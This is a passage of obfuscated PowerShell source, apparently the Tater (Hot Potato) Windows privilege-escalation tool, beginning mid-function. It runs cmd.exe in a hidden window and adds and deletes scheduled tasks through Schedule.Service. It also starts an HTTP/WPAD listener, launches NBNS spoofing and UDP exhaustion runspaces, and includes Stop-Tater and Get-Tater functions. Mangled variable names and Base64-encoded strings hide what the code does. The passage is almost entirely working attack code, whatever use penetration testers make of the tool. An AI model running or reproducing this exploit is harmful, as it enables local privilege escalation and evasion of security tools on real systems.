                saps -FilePath $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBtAGQALgBlAHgAZQA='))) -Argument ${___/\__/=\/==\_/=} -WindowStyle Hidden -passthru -Wait
                ${_/\_____/\/\____/} = new-object -com($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAC4AUwBlAHIAdgBpAGMAZQA='))))
                ${_/\_____/\/\____/}.connect() 
                ${/=======\___/\/==} = ${_/\_____/\/\____/}.getfolder("\").gettasks(1)
                ${__/\__/\/=\___/==}.task_added = $false
                foreach(${/=\_/\/==\/==\__/} in ${/=======\___/\/==})
                {
                    if(${/=\_/\/==\/==\__/}.name -eq ${__/\__/\/=\___/==}.task)
                    {
                        ${__/\__/\/=\___/==}.task_added = $true
                    }
                }
                ${_/\_____/\/\____/}.Quit()
                if(!${__/\__/\/=\___/==}.task_added -and !${__/\__/\/=\___/==}.SMBRelay_success)
                {
                    ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Adding scheduled task " + ${__/\__/\/=\___/==}.task + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABmAGEAaQBsAGUAZAA='))))
                    ___/====\/\/\_/=\/
                }
            }
            elseif(${__/\__/\/=\___/==}.task_added -and (Get-Date) -ge ${__/\_/===\/==\_/\}.AddMinutes(2))
            {
                ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Something went wrong with the service")
                ___/====\/\/\_/=\/
            }
        }
        if(${__/\__/\/=\___/==}.SMBRelay_success)
        {
            kill -id ${/===\/=\__/\_/=\/}.Id
        }
        if($RunTime)
        {
            if(${__/\_/\/===\_/===}.Elapsed -ge ${/\____/===\/\_/==})
            {
                ___/====\/\/\_/=\/
            }
        } 
        sleep -m 5
    }
 }
function __/==\/\/\_/==\/=\()
{
    if($WPADPort -eq '80')
    {
        ${__/\__/\/=\___/==}.HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::loopback,$HTTPPort)
    }
    else
    {
        ${__/\__/\/=\___/==}.HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::any,$HTTPPort)
    }
    ${__/\__/\/=\___/==}.HTTP_listener = New-Object System.Net.Sockets.TcpListener ${__/\__/\/=\___/==}.HTTP_endpoint
    ${__/\__/\/=\___/==}.HTTP_listener.Start()
    ${__/\_/=\_/\_/\_/\} = [RunspaceFactory]::CreateRunspace()
    ${__/\_/=\_/\_/\_/\}.Open()
    ${__/\_/=\_/\_/\_/\}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABhAHQAZQByAA=='))),${__/\__/\/=\___/==})
    ${_/===\/===\/\/\/\} = [PowerShell]::Create()
    ${_/===\/===\/\/\/\}.Runspace = ${__/\_/=\_/\_/\_/\}
    ${_/===\/===\/\/\/\}.AddScript(${_/=\_______/==\/=}) > $null
    ${_/===\/===\/\/\/\}.AddScript(${__/=\/\/====\__/=}) > $null
    ${_/===\/===\/\/\/\}.AddScript(${__/===\__/=\_/==\}) > $null
    ${_/===\/===\/\/\/\}.AddScript(${_/=\/=\/\__/\_/\_}) > $null
    ${_/===\/===\/\/\/\}.AddScript(${__/====\/=\___/\_}) > $null
    ${_/===\/===\/\/\/\}.AddScript(${/===\/\__/\/=\/==}).AddArgument($Command).AddArgument($HTTPPort).AddArgument(
                               $WPADDirectHosts).AddArgument($WPADPort) > $null
    ${_/===\/===\/\/\/\}.BeginInvoke() > $null
}
function _/==\____/==\_/=\_()
{
    ${___/\_/========\/} = [RunspaceFactory]::CreateRunspace()
    ${___/\_/========\/}.Open()
    ${___/\_/========\/}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABhAHQAZQByAA=='))),${__/\__/\/=\___/==})
    ${_/==\___/\/\/==\_} = [PowerShell]::Create()
    ${_/==\___/\/\/==\_}.Runspace = ${___/\_/========\/}
    ${_/==\___/\/\/==\_}.AddScript(${_/=\_______/==\/=}) > $null
    ${_/==\___/\/\/==\_}.AddScript(${__/\/\/\__/\/=\/\}) > $null
    ${_/==\___/\/\/==\_}.BeginInvoke() > $null
}
function ___/=\_/\/=\_/\_/\()
{
    ${__/=\_/\_/\_/\_/=} = [RunspaceFactory]::CreateRunspace()
    ${__/=\_/\_/\_/\_/=}.Open()
    ${__/=\_/\_/\_/\_/=}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABhAHQAZQByAA=='))),${__/\__/\/=\___/==})
    ${___/=\_/====\__/\} = [PowerShell]::Create()
    ${___/=\_/====\__/\}.Runspace = ${__/=\_/\_/\_/\_/=}
    ${___/=\_/====\__/\}.AddScript(${_/=\_______/==\/=}) > $null
    ${___/=\_/====\__/\}.AddScript(${__/====\/=\___/\_}) > $null
    ${___/=\_/====\__/\}.AddScript(${__/\/=\/\_/\___/\}).AddArgument($IP).AddArgument($SpooferIP).AddArgument(
                                  $Hostname).AddArgument($NBNSLimit) > $null
    ${___/=\_/====\__/\}.BeginInvoke() > $null
}
function _/===\_____/\_____()
{
    ${_/\_/===\/\/\/=\/} = [RunspaceFactory]::CreateRunspace()
    ${_/\_/===\/\/\/=\/}.Open()
    ${_/\_/===\/\/\/=\/}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABhAHQAZQByAA=='))),${__/\__/\/=\___/==})
    ${_/\/========\____} = [PowerShell]::Create()
    ${_/\/========\____}.Runspace = ${_/\_/===\/\/\/=\/}
    ${_/\/========\____}.AddScript(${_/=\_______/==\/=}) > $null
    ${_/\/========\____}.AddScript(${/==\____/\__/\/\/}).AddArgument($NBNS).AddArgument($NBNSLimit).AddArgument(
                                $RunTime).AddArgument($SpooferIP).AddArgument($Hostname).AddArgument(
                                $HTTPPort) > $null
    ${_/\/========\____}.BeginInvoke() > $null
}
__/==\/\/\_/==\/=\
if($ExhaustUDP -eq 'Y')
{
    _/==\____/==\_/=\_
}
if($NBNS -eq 'Y')
{
    ___/=\_/\/=\_/\_/\
}
_/===\_____/\_____
if(${__/\__/\/=\___/==}.console_output)
{
    :console_loop while(${__/\__/\/=\___/==}.running -and ${__/\__/\/=\___/==}.console_output)
    {
        while(${__/\__/\/=\___/==}.console_queue.Count -gt 0)
        {
            echo(${__/\__/\/=\___/==}.console_queue[0] + ${__/\__/\/=\___/==}.newline)
            ${__/\__/\/=\___/==}.console_queue.RemoveRange(0,1)
        }
        if(${__/\__/\/=\___/==}.console_input)
        {
            if([Console]::KeyAvailable)
            {
                ${__/\__/\/=\___/==}.console_output = $false
                BREAK console_loop
            }
        }
        sleep -m 5
    }
    if(!${__/\__/\/=\___/==}.running)
    {
        rv tater -scope global
    }
}
}
function Stop-Tater
{
    if(${__/\__/\/=\___/==})
    {
        if(${__/\__/\/=\___/==}.running)
        {
            echo "$(Get-Date -format 's') - Stopping HTTP listener"
            ${__/\__/\/=\___/==}.HTTP_listener.server.blocking = $false
            sleep -s 1
            ${__/\__/\/=\___/==}.HTTP_listener.server.Close()
            sleep -s 1
            ${__/\__/\/=\___/==}.HTTP_listener.Stop()
            ${__/\__/\/=\___/==}.running = $false
            if(${__/\__/\/=\___/==}.task_delete -and ${__/\__/\/=\___/==}.task_added)
            {
                ${/===\_/===\/\_/==} = $false
                ${_/\_____/\/\____/} = new-object -com($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAC4AUwBlAHIAdgBpAGMAZQA='))))
                ${_/\_____/\/\____/}.connect()
                ${___/\/\___/=\_/=\} = ${_/\_____/\/\____/}.getfolder("\")
                ${/=======\___/\/==} = ${___/\/\___/=\_/=\}.gettasks(1)
                foreach(${/=\_/\/==\/==\__/} in ${/=======\___/\/==})
                {
                    if(${/=\_/\/==\/==\__/}.name -eq ${__/\__/\/=\___/==}.task)
                    {
                        ${___/\/\___/=\_/=\}.DeleteTask(${/=\_/\/==\/==\__/}.name,0)
                    }
                }
                foreach(${/=\_/\/==\/==\__/} in ${/=======\___/\/==})
                {
                    if(${/=\_/\/==\/==\__/}.name -eq ${__/\__/\/=\___/==}.task)
                    {
                        ${/===\_/===\/\_/==} = $true
                    }
                }
                if(${/===\_/===\/\_/==})
                {
                    echo ("$(Get-Date -format 's') - Scheduled task " + ${__/\__/\/=\___/==}.task + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABkAGUAbABlAHQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkA'))))
                }
                else
                {
                    echo ("$(Get-Date -format 's') - Scheduled task " + ${__/\__/\/=\___/==}.task + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABkAGUAbABlAHQAaQBvAG4AIABmAGEAaQBsAGUAZAAsACAAcgBlAG0AbwB2AGUAIABtAGEAbgB1AGEAbABsAHkA'))))
                }
            }
            elseif(${__/\__/\/=\___/==}.task_added)
            {
                echo ("$(Get-Date -format 's') - Remove scheduled task " + ${__/\__/\/=\___/==}.task + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABtAGEAbgB1AGEAbABsAHkAIAB3AGgAZQBuACAAZgBpAG4AaQBzAGgAZQBkAA=='))))
            }
            echo "$(Get-Date -format 's') - Tater has been stopped"
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHQAZQByACAAaQBzAG4AJwB0ACAAcgB1AG4AbgBpAG4AZwA=')))
        }
    }
    else
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHQAZQByACAAaQBzAG4AJwB0ACAAcgB1AG4AbgBpAG4AZwA=')))
    }
    rv tater -scope global
} 
function Get-Tater
{
    while(${__/\__/\/=\___/==}.console_queue.Count -gt 0)
    {
        echo(${__/\__/\/=\___/==}.console_queue[0] + ${__/\__/\/=\___/==}.newline)
        ${__/\__/\/=\___/==}.console_queue.RemoveRange(0,1)
    }
}